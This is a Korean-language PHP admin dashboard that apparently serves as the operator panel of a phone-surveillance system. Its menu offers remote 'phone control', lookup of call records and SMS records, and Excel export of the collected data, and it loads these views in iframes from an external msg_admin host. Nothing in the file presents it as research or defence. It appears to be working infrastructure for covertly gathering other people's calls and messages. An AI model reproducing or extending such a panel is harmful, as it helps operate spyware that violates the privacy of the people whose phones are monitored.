<?php
session_start();
if( $_SESSION['admin'] !== 'true'){
    echo("<script>location.href='index.php';</script>");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en" >
<head>
    <meta charset="UTF-8">
    <title>관리자 페이지</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
    <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'><link rel="stylesheet" href="css/style_main.css">

</head>
<body>
<!-- partial:index.partial.html -->
<body>
<div class="header-container-wrapper">
    <div class="row-clear row">
        <div class="left-header col-4">
            <div class="date-wrapper">
                <div class="date">
                    <?php
                    echo date("Y/m/d");
                    ?>
                </div>
            </div>
            <div class="logo">
                <h1>관리자</h1>
            </div>


        </div>
        <div class="right-header col-8 row-clear">
            <div class="right-content carry-right">
                <div class="user-detail">
                    <div class="user-icon">
                        <i class="fa fa-user"></i>
                        <div class="user-name-wrapper">
                            <span class="user-name">관리자<i class="fa fa-chevron-down"></i></span>
                            <ul>
                                <li><i class="fa fa-envelope"></i>시스템 메세지 확인</li>
                                <li><i class="fa fa-pencil"></i>정보 수정</li>
                                <li><i class="fa fa-sign-out"></i>로그 아웃</li>
                            </ul>
                        </div>
                        <span class="notification"><i class="fa fa-bell"></i><!--<span class="notification-count">1</span>--></span>
                        <i class="fa fa-cog"></i>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="fixed-item-container">
    <!--
    <ul class="tabber-list">
        <li><i class="fa fa-cog"></i><span>Setting</span></li>
        <li><i class="fa fa-bell"></i><span>Notification</span></li>
        <li><i class="fa fa-power-off"></i><span>Power Menu</span></li>
    </ul>
    <div class="fixed-notification"></div>
    -->
</div>
<div class="body-container-wrapper">
    <div style="float: left;"  class="left-sidebar">
        <ul class="list">
            <li><a href="main.php" ><i class="fa fa-tachometer"></i>대시보드</a></li>
            <li><a href="main.php?page=view_control"><i class="fa fa-line-chart"></i>휴대폰 제어</a></li>
            <li><a href="main.php?page=view_calldatalist"><i class="fa fa-product-hunt"></i>전화기록조회</a></li>
            <li><a href="main.php?page=view_smsdatalist"><i class="fa fa-users"></i>문자기록조회</a></li>
            <!-- <li><a><i class="fa fa-share-square"></i>Social</a></li> -->
            <!--  <li><a><i class="fa fa-sitemap"></i>Sitemap</a></li> -->
            <!-- <li><a><i class="fa fa-newspaper-o"></i>Create a Site</a> -->
            <!--    <ul>
                    <li><a>Website Page</a></li>
                    <li><a>Landing Page</a></li>
                    <li><a>Ecommerce</a></li>
                    <li><a>CTA</a></li>
                </ul>
            </li>
            <li><a><i class="fa fa-envelope"></i>Email</a>
                <ul>
                    <li><a>Create an Email</a></li>
                    <li><a>Email Tracker</a></li>
                    <li><a>Free Email</a></li>
                    <li><a>Send Emails</a></li>
                </ul>
            </li>
            <li><a><i class="fa fa-shopping-bag"></i>Marketing</a></li>
            <li><a><i class="fa fa-file"></i> File Manager</a>
                <ul>
                    <li><a>CDN File Manager</a>
                        <ul>
                            <li><a>CDN File Manager</a></li>
                            <li><a>Domain File Manager</a></li>
                        </ul>
                    </li>
                    <li><a>Domain File Manager</a></li>
                </ul>
            </li>
            <li><a><i class="fa fa-database"></i>Data</a>
                <ul>
                    <li><a>Bulk Data</a></li>
                    <li><a>Backup Data</a></li>
                    <li><a>Upload Data</a></li>
                </ul>
            </li>
            <li><a><i class="fa fa-cloud"></i>Cloud</a>
                <ul>
                    <li><a>Cloud Upload</a></li>
                    <li><a>Cloud Download</a></li>
                </ul>
            </li>
            <li><a><i class="fa fa-plug"></i>Plugins</a>
                <ul>
                    <li><a>Add Plugins</a></li>
                    <li><a>Create Plugins</a></li>
                    <li><a>Update Plugins</a></li>
                    <li><a>Remove Plugins</a></li>
                </ul>
            </li>
            <li><a><i class="fa fa-rocket"></i>Application</a>
                <ul>
                    <li><a>Application Store</a></li>
                    <li><a>Create Application</a></li>
                    <li><a>Update Application</a></li>
                    <li><a>Remove Application</a></li>
                </ul>
            </li>
            -->
        </ul>
        <div class="received-data">
            <a class=""><i class="fa fa-cloud-download"></i>데이터 엑셀 다운</a>
        </div>
    </div>

    <div style="float: left;" class="main-content" id="content">
        <?php
        if( $_GET['page'] === 'view_calldatalist') echo "<iframe frameborder=\"0\"  style=\"overflow: hidden; width: 1200px;height: 690px;\" src=\"http://score-test5.com/msg_admin/view_calldatalist.php\" scrolling=\"no\"></iframe>";
        else if( $_GET['page'] === 'view_smsdatalist' ) echo "<iframe frameborder=\"0\"  style=\"overflow: hidden; width: 1200px;height: 690px;\" src=\"http://score-test5.com/msg_admin/view_smsdatalist.php\" scrolling=\"no\"></iframe>";
        else if( $_GET['page'] === 'view_control') echo "<iframe frameborder=\"0\"  style=\"overflow: hidden; width: 1200px;height: 690px;\" src=\"http://score-test5.com/msg_admin/view_control.php\" scrolling=\"no\"></iframe>";
        ?>
    </div>


</div>


</body>


<!-- partial -->
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script><script  src="js/script_main.js"></script>

</body>
</html>